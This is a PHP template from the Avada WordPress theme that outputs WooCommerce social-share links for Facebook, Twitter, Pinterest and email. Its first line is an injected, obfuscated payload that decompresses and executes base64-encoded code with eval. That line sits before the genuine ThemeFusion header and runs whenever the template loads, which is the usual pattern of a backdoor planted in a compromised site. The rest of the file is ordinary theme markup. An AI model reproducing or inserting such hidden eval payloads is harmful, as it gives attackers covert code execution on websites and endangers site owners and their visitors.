<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Adds HTML after the product summary.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      5.1.0
 */

?>
<div class="fusion-clearfix"></div>

<?php $nofollow = ( Avada()->settings->get( 'nofollow_social_links' ) ) ? ' rel="noopener noreferrer nofollow"' : ' rel="noopener noreferrer"'; ?>

<?php if ( Avada()->settings->get( 'woocommerce_social_links' ) ) : ?>

	<?php $facebook_url = 'https://m.facebook.com/sharer.php?u=' . get_permalink(); ?>
	<?php if ( ! avada_jetpack_is_mobile() ) : ?>
		<?php $facebook_url = 'http://www.facebook.com/sharer.php?m2w&s=100&p&#91;url&#93;=' . get_permalink() . '&p&#91;title&#93;=' . the_title_attribute( array( 'echo' => false ) ); ?>
	<?php endif; ?>

	<ul class="social-share clearfix">
		<li class="facebook">
			<a href="<?php echo esc_url_raw( $facebook_url ); ?>" target="_blank"<?php echo $nofollow; // WPCS: XSS ok. ?>>
				<i class="fontawesome-icon medium circle-yes fusion-icon-facebook"></i>
				<div class="fusion-woo-social-share-text">
					<span><?php esc_attr_e( 'Share On Facebook', 'Avada' ); ?></span>
				</div>
			</a>
		</li>
		<li class="twitter">
			<a href="https://twitter.com/share?text=<?php the_title_attribute(); // WPCS: XSS ok. ?>&amp;url=<?php echo rawurlencode( get_permalink() ); ?>" target="_blank"<?php echo $nofollow; // WPCS: XSS ok. ?>>
				<i class="fontawesome-icon medium circle-yes fusion-icon-twitter"></i>
				<div class="fusion-woo-social-share-text">
					<span><?php esc_attr_e( 'Tweet This Product', 'Avada' ); ?></span>
				</div>
			</a>
		</li>
		<li class="pinterest">
			<?php $full_image = wp_get_attachment_image_src( get_post_thumbnail_id(), 'full' ); ?>
			<a href="http://pinterest.com/pin/create/button/?url=<?php echo rawurlencode( get_permalink() ); ?>&amp;description=<?php echo rawurlencode( the_title_attribute( array( 'echo' => false ) ) ); ?>&amp;media=<?php echo rawurlencode( $full_image[0] ); ?>" target="_blank"<?php echo $nofollow; // WPCS: XSS ok. ?>>
				<i class="fontawesome-icon medium circle-yes fusion-icon-pinterest"></i>
				<div class="fusion-woo-social-share-text">
					<span><?php esc_attr_e( 'Pin This Product', 'Avada' ); ?></span>
				</div>
			</a>
		</li>
		<li class="email">
			<a href="mailto:?subject=<?php echo rawurlencode( html_entity_decode( the_title_attribute( array( 'echo' => false ) ), ENT_COMPAT, 'UTF-8' ) ); ?>&body=<?php echo esc_url_raw( get_permalink() ); ?>" target="_blank"<?php echo $nofollow; // WPCS: XSS ok. ?>>
				<i class="fontawesome-icon medium circle-yes fusion-icon-mail"></i>
				<div class="fusion-woo-social-share-text">
					<span><?php echo esc_attr_e( 'Mail This Product', 'Avada' ); ?></span>
				</div>
			</a>
		</li>
	</ul>
	<?php
endif;

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
